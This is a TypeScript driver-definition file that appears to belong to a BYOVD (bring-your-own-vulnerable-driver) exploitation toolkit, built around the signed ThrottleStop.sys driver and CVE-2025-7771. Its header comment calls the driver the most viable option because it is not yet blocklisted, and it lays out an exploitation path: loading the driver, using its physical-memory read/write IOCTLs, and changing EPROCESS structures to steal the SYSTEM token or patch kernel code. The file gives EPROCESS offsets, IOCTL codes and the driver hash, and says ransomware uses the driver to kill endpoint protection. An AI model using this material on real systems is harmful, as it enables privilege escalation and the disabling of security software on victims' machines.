/**
 * ThrottleStop.sys driver definition (TechPowerUp ThrottleStop).
 *
 * CVE-2025-7771 (CVSS 8.7).  Published August 2025.
 *
 * This is the MOST VIABLE current BYOVD option because:
 *   1. NOT yet blocklisted by Microsoft's HVCI driver blocklist
 *   2. Digitally signed by TechPowerUp (loads with DSE enabled)
 *   3. Exposes arbitrary physical memory R/W via MmMapIoSpace
 *   4. Exploited in-the-wild by AV Killer + Gentlemen ransomware
 *
 * The driver maps physical addresses using MmMapIoSpace with zero
 * bounds checking or access control on IOCTLs 0x80006498 (read) and
 * 0x8000649C (write).  Read/write size is 1, 2, 4, or 8 bytes per call.
 *
 * Because this is a PHYSICAL memory driver, the manager must translate
 * virtual addresses to physical addresses before each operation.  This
 * is done via Superfetch PFN queries (NtQuerySystemInformation class 79)
 * or by reading the process page tables.
 *
 * Exploitation path:
 *   1. Load ThrottleStop.sys as a kernel service (requires Admin)
 *   2. Open \\\\.\\ThrottleStop via CreateFile
 *   3. Build VA→PA map via PFN database queries
 *   4. Read/write physical memory to manipulate EPROCESS structures
 *   5. Steal SYSTEM token or patch kernel code
 *
 * EPROCESS offsets (Win10 20H2–22H2 / Win11 22H2–23H2 x64):
 *   UniqueProcessId  0x440
 *   ActiveProcessLinks 0x448
 *   Token            0x4b8  (_EX_FAST_REF — mask low 4 refcount bits)
 *   Protection       0x87A
 *
 * Official source: https://www.techpowerup.com/download/techpowerup-throttlestop/
 */

import type { ByovdDriverDef } from '../types';

export const ThrottleStop: ByovdDriverDef = {
  name: 'ThrottleStop',
  version: '3.0.0.0',
  downloadUrl: 'https://www.techpowerup.com/download/techpowerup-throttlestop/',
  serviceName: 'ThrottleStop',
  devicePath: '\\\\.\\ThrottleStop',
  binaryPath: 'C:\\Windows\\System32\\drivers\\ThrottleStop.sys',
  ioctlReadMemory: 0x80006498,
  ioctlWriteMemory: 0x8000649c,
  ioctlReadMsr: 0x80006448,
  ioctlWriteMsr: 0x8000644c,
  capabilities: ['read', 'write', 'physical'],
  // SHA-256 of TechPowerUp-signed ThrottleStop.sys v3.0.0.0 (CVE-2025-7771).
  // Source: CVE-2025-7771 public advisories / Kaspersky Labs / GitHub PoCs.
  sha256: '16f83f056177c4ec24c7e99d01ca9d9d6713bd0497eeedb777a3ffefa99c97f0',
  cve: ['CVE-2025-7771'],
  status: 'available',
  physicalMemory: true,
  description:
    'TechPowerUp ThrottleStop.sys (CVE-2025-7771, CVSS 8.7) exposes ' +
    'arbitrary physical memory R/W via MmMapIoSpace through IOCTLs ' +
    '0x80006498/0x8000649C with no access control.  NOT yet blocklisted ' +
    'as of 2025.  Phys-memory driver — requires VA→PA translation.  ' +
    'Exploited in-the-wild by AV Killer ransomware to terminate EDR.',
};
